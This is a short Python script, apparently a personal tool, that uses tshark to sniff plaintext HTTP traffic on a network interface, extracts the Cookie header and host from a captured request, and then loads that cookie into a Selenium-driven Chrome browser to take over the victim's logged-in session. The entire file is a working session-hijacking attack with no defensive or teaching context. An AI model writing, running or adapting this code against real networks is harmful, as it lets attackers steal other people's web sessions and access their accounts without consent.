from sys import argv
import subprocess
from selenium import webdriver


interface = argv[1]
separator = '|'

command = ['tshark', '-i', interface, '-l', '-Y', 'http.request', '-T', 'fields', '-e', 'http.cookie', '-e', 'http.host', '-e', 'http.user_agent',  '-E', f'separator={separator}']

tshark_process = subprocess.Popen(command, stdout=subprocess.PIPE)

host = ''
cookie = {'name': '', 'value': ''}

browser = webdriver.Chrome(executable_path='/home/wojtek/Downloads/chromedriver')

while True:
    output = tshark_process.stdout.readline().decode('utf-8').split('\n')[0]

    #check if child process terminated
    if output == '' and tshark_process.poll() is not None:
        break
      
    #check if we captured cookie
    if output:
        #split values using separator
        cookie_str, host, _ = output.split(separator)
        splited = cookie_str.split(';')
        print(splited)
        if splited != ['']:
            for item in splited:
                cookie['name'] = item.split('=')[0]
                cookie['value'] = item.split('=')[1]
            break


print('captured cookie: ', cookie)
browser.get('http://' + host)
browser.delete_cookie(cookie['name'])
browser.add_cookie(cookie)
browser.refresh()
